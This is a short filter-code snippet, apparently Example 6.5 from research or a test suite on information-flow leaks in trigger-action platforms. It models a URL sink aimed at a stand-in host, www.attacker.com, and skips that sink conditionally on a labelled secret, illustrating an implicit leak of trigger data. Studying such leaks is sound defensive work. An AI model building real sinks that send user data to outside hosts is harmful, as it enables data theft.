// Filter code in Example 6.5
// Maker: ---
// Link : ---

// Trigger: ---
// Action: ---

// Policy/Presence: Confidentiality of trigger data / No

h = lbl(true);
url = urll("www.attacker.com");
sink('Sink', '', url);
if (h) {
	skip('Sink');
}
